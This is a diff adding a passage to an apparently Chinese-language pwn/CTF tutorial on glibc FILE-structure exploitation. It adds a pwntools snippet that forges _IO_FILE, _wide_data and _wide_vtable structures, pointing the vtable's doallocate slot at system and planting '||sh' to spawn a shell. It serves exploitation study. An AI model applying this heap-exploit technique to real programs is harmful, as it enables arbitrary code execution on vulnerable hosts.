@@ -227,6 +227,33 @@ libc_hidden_def (_IO_wdoallocbuf)
 - `_wide_data->_wide_vtable->doallocate`（偏移为 0x68）设置为 ogg or `system` 拿 shell
 
 
+一个 exp 构造如下：
+
+```python
+fakeio = flat({
+    0: b"\x20\x80||sh",
+    0x20: 0,
+    0x28: 1,
+    # 0x88: libc.sym['_IO_stdfile_2_lock'],  # glibc 2.38 以上会 check _lock 字段
+    0xa0: heap_addr + 0x43010,  # _wide_data
+    0xd8: libc.sym['_IO_wfile_jumps']
+}, filler=b"\x00")
+
+fakewide = flat({
+    0x18: 0,
+    0x30: 0,
+    0xe0: heap_addr + 0x65010,
+}, filler=b"\x00")
+
+fake_wide_vtable = flat({
+    0x68: libc.sym['system']
+}, filler=b"\x00")
+```
+
+也就是要伪造一个 `_IO_FILE` 结构体，一个 `_wide_data` 结构体，一个 `_wide_vtable` 结构体
+
+
+
 #### _IO_wfile_underflow_mmap
 
 ```c
